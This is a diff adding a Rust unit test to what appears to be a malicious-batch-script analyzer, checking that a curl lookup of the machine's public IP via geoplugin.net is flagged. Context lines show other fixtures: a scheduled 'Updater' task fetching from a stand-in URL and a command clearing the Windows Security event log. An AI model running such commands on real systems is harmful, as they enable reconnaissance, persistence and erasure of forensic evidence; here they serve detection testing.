@@ -2199,6 +2199,23 @@ schtasks /create /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks.example/
     }
 
     #[test]
+    fn geoplugin_public_ip_lookup_emits_network_probe() {
+        let script = br#"@echo off
+for /f "tokens=1 delims=:" %%A in ('curl -# -k "http://www.geoplugin.net/php.gp?ip"') do set geo=%%A
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::NetworkProbe { probe_kind, target }
+                    if probe_kind == "ip-discovery" && target == "www.geoplugin.net"
+            )),
+            "geoplugin public-IP lookup was not typed as NetworkProbe: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn evidence_cleanup_artifacts_emit_traits() {
         let script = b"@echo off\r\n\
             wevtutil cl Security\r\n\
